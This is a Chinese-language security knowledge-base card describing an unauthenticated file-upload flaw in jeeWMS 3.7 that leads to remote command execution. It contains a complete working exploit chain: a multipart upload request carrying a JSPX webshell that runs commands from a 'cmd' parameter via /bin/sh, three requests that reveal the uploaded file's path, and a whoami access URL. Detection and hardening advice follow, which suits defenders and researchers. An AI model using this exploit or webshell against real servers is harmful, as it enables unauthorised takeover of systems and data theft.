---
id: web-generic-file-upload-jeewms-cgupload-extension-upload
title: jeeWMS CgUploadController 任意扩展名上传配合三种路径回显写 JSPX WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: upload-preserve-extension-with-path-disclosure
aliases:
- jeeWMS 文件上传 RCE
- CgUploadController 上传
- saveFiles 上传
- jeeWMS 上传 jspx
- openViewFile 路径回显
- objfileGrid 反射回显
tags:
- jeewms
- java
- file-upload
- webshell
- jspx
- path-disclosure
- reflection
- rce
cve: []
severity: critical
confidence: high
status: verified
affected_versions: jeeWMS 3.7（原文复现 commit 580e924afed5a...）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V39
  verified_at: '2026-11-05T06:28:01+08:00'
  notes: 已对照原文与43张图核对：saveFiles(params=saveFiles,POST)、cusPath=files、setSwfpath、byteField=null（图06）、UploadFile basePath=upload/rename=true（图07/08）、重命名保留用户扩展名（图09）；三种路径回显 openViewFile/swfpath（图12-15）、objfileGrid/realpath（图16-21、24）、getFiles/path（图23、27）；上传 shell.jspx 后访问返回 RCE_OK root（图14）。未验证点：PoC 未本机复跑；writeBack 动态 SQL 原文仅作机制解释未利用。原文明确版本 3.7，affected_versions 保留；frontmatter 无 sources/source_url。
---

## 一句话结论

jeeWMS 的 `CgUploadController.saveFiles()` 在重命名上传文件时只保留用户提供的扩展名，不校验后缀与内容，攻击者可经鉴权绕过未授权上传 `shell.jspx`；响应只返回 `fileKey`，但同一应用的 `openViewFile`、`objfileGrid`、`getFiles` 三个接口都能把该附件的真实路径回显出来，拼接后访问即可执行任意命令。

## 原理

- `CgUploadController.saveFiles()`（`params="saveFiles"`，POST）构造 `UploadFile`，默认 `basePath=upload`，`cusPath=files`，因此落盘目录为 `upload/files/`，真实路径是 `ServletContext.getRealPath("/") + "/upload/files/"`。
- `UploadFile.rename` 默认 `true`；`CommonDao.uploadFile()` 在重命名分支用 `yyyyMMddHHmmss + 8 位随机数` 生成主名，但扩展名取自 `FileUtils.getExtend(fileName)`，即用户上传文件名后缀。没有扩展名白名单、MIME 或内容检查，`shell.jspx` 原样保留。
- 路径拼接使用 `realPath + myfilename`，而 `realPath` + `cusPath` 来自请求/默认配置；本例 `cusPath` 固定为 `files`，不构成穿越，但上传点是任意可执行后缀。
- 上传后只返回 `fileKey`，没有直接返回路径。三种回显路径：
  1. `CommonController.openViewFile`：按 `fileid` 取附件实体，反射读取 `swfpath`；`swfpath` 与 `realpath` 只差后缀（`.swf` vs 原后缀），把 `.swf` 换成 `.jspx` 即上传路径。
  2. `CommonController.objfileGrid`：方法参数里有 `DataGrid`，Spring MVC 自动绑定请求参数；`field` 会被逗号分割成字段名，`TagUtil.fieldNametoValues()` 用反射 getter 取值。攻击者可控制 `subclassname`（类名）与 `field`（属性名），让 `realpath` 属性回显在 JSON 中。
  3. `TmsYwDingdanController.getFiles`/`wmCusCostHController.getFiles`：按 `cgFormId` 查 `CgUploadEntity` 并返回 `path`，只需传 `id`。
- 上述接口都可通过 jeeWMS 的鉴权绕过未授权访问，形成完整未授权上传 → 路径获取 → WebShell 执行链。

## 触发条件

- jeeWMS 3.7 暴露 `CgUploadController`，且上传目录位于 Web 根下、Tomcat 能解析 `.jspx`。
- 存在可用的鉴权绕过（`rest/cgUploadController` 或 `.do?wmsApiController.do`）。
- `cgFormName` 必须是数据库真实表名（`writeBack` 会执行 `update ${cgFormName} ...`），可随便选一个存在表，如 `ba_act_type`；`cgFormId`/`cgFormField` 也需能匹配，否则 `writeBack` 报错但不影响文件已上传。
- 上传目录可写，进程权限允许创建文件。

## 利用步骤

1. 确认 `rest/cgUploadController` 未授权可访问；准备一个 `.jspx` WebShell，内容执行 `cmd` 参数命令并输出。
2. 以 multipart POST 发送 `saveFiles=1`、`cgFormId`、`cgFormName`、`cgFormField` 以及文件字段（原文文件字段名也为 `cgFormField`，带 `filename="shell.jspx"`）。
3. 从响应 `attributes.fileKey` 取得附件 ID。
4. 任选一种路径回显：
   - `POST /rest/commonController` 体：`openViewFile=1&fileid=<fileKey>`，读 `swfpath`，把 `.swf` 改为 `.jspx`；
   - `POST /rest/commonController` 体：`objfileGrid=1&subclassname=org.jeecgframework.web.cgform.entity.upload.CgUploadEntity&filekey=<fileKey>&field=id,realpath&page=1&rows=5`，读 JSON 中 `realpath`；
   - `POST /rest/tmsYwDingdanController` 体：`getFiles=1&id=<cgFormId>`，读 `path`。
5. 访问 `http://target/jeewms/<realpath>?cmd=whoami`，确认 `RCE_OK` 与命令输出。
6. 清理上传文件与数据库附件记录（授权测试）。

## PoC

上传请求（原文可用）：

```http
POST /jeewms/rest/cgUploadController HTTP/1.1
Host: target:8081
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvVVYRo0eAw76yXYn
Content-Length: 141

------WebKitFormBoundaryvVVYRo0eAw76yXYn
Content-Disposition: form-data; name="saveFiles"

1
------WebKitFormBoundaryvVVYRo0eAw76yXYn
Content-Disposition: form-data; name="cgFormId"

1
------WebKitFormBoundaryvVVYRo0eAw76yXYn
Content-Disposition: form-data; name="cgFormName"

ba_act_type
------WebKitFormBoundaryvVVYRo0eAw76yXYn
Content-Disposition: form-data; name="cgFormField"

id
------WebKitFormBoundaryvVVYRo0eAw76yXYn
Content-Disposition: form-data; name="cgFormField"; filename="shell.jspx"

<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:directive.page import="java.io.*" contentType="text/plain;charset=UTF-8"/>
<jsp:scriptlet>
out.println("RCE_OK");
String cmd = request.getParameter("cmd");
if (cmd != null &amp;&amp; cmd.length() &gt; 0) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
    String line;
    while ((line = r.readLine()) != null) out.println(line);
}
</jsp:scriptlet>
</jsp:root>
------WebKitFormBoundaryvVVYRo0eAw76yXYn--
```

路径回显（三选一）：

```http
POST /jeewms/rest/commonController HTTP/1.1
Content-Type: application/x-www-form-urlencoded

openViewFile=1&fileid=2c9680839d24d1d2019d250931310006
```

```http
POST /jeewms/rest/commonController HTTP/1.1
Content-Type: application/x-www-form-urlencoded

objfileGrid=1&subclassname=org.jeecgframework.web.cgform.entity.upload.CgUploadEntity&filekey=2c9680839d24d1d2019d250931310006&field=id,realpath&page=1&rows=5
```

```http
POST /jeewms/rest/tmsYwDingdanController HTTP/1.1
Content-Type: application/x-www-form-urlencoded

getFiles=1&id=2
```

访问：`GET /jeewms/upload/files/<timestamp><random>.jspx?cmd=whoami`。

## 变体与关联

- 后缀变体：`.jsp`、`.jspx`、`.jspf`、容器可解析的其它扩展；若目标禁用脚本解析，可尝试上传 `.xml`/配置覆盖。
- 路径回显变体：`openViewFile` 的 `swfpath`、`objfileGrid` 的任意 getter、`getFiles` 的 `path`；本质是“上传后如何定位文件”。
- 反射变体：`objfileGrid` 的 `subclassname` + `field` 可读取任意类的 getter 属性，属于独立的敏感信息泄露面。
- 关联卡片：[[web-generic-auth-jeewms-authinterceptor-whitelist-regex-contains-bypass]]、[[web-generic-file-upload-user-controlled-filename-webshell]]、[[web-generic-file-upload-jeewms-tokencontroller-saveimage-traversal]]。
- 注意：`writeBack` 走 MiniDao 的 `update ${cgFormName} ...`，参数若可控还存在 SQL 注入风险，但原文未利用，未单独建卡。

## 检测与防御

- 检测：`/rest/cgUploadController` 或 `/cgUploadController.do?wmsApiController.do` 的 multipart 请求，文件名后缀为 `.jsp/.jspx/.jspf`；`upload/files/` 下出现脚本文件。
- 检测：短时间内先上传、再调用 `openViewFile`/`objfileGrid`/`getFiles` 查询路径、随后访问新脚本的请求序列。
- 检测：`objfileGrid` 的 `subclassname`/`field` 参数指向附件实体之外或敏感属性（`realpath`、`swfpath`、密码字段等）。
- 防御：上传后缀白名单 + 内容/MIME 校验；重命名时强制使用安全扩展名（如统一 `.bin`）；上传目录移出 Web 根并禁止脚本解析。
- 防御：不在响应中回显真实路径/`swfpath`；`objfileGrid` 按固定字段白名单输出，禁止用户控制 `subclassname` 与 `field`。
- 加固：修复鉴权绕过；上传接口要求认证与权限；限制 `cgFormName`/`cgFormField` 只能来自服务端元数据。
- 响应：删除恶意脚本、清理附件表记录、排查同时间段其它上传与访问日志。
